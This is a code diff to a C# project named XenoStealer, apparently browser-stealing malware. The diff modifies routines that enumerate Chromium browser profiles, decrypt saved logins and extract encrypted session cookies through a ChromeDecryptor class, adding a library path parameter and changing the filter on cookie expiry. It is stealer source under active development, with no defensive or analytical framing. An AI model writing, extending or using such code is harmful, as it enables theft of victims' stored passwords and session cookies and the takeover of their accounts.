@@ -37,12 +37,13 @@ namespace XenoStealer
 
                 string browserName = browserInfo.Key;
                 string browserProfilesPath = browserInfo.Value;
+                string browserLibraryPath = Configuration.ChromiumBrowsersLikelyLocations[browserName];
                 if (!Directory.Exists(browserProfilesPath))
                 {
                     continue;
                 }
 
-                ChromeDecryptor decryptor = new ChromeDecryptor(browserProfilesPath);
+                ChromeDecryptor decryptor = new ChromeDecryptor(browserProfilesPath, browserLibraryPath);
                 bool canDecrypt = decryptor.operational;
 
                 foreach (string profile in GetProfiles(browserProfilesPath)) 
@@ -192,6 +193,7 @@ namespace XenoStealer
             }
         
             return logins.ToArray();
+        
         }
         public static DataExtractionStructs.ChromiumCookie[] GetCookies(string profilePath, ChromeDecryptor decryptor) 
         {
@@ -234,14 +236,11 @@ namespace XenoStealer
                 bool secure = parser.GetValue<int>(i, "is_secure") == 1;
                 bool httpOnly = parser.GetValue<int>(i, "is_httponly") == 1;
 
-                if (domain == null || name == null || path == null || encryptedCookieBuffer == null) continue;
-
-                if (expiry == 0)
-                {
-                    expiry = long.MaxValue;
-                }
-
-
+                if (domain == null || name == null || path == null || encryptedCookieBuffer == null || expiry == 0) continue;
+                
+        
+                
+        
                 string decryptedCookie = decryptor.Decrypt(encryptedCookieBuffer);
                 if (string.IsNullOrEmpty(decryptedCookie))
                 {
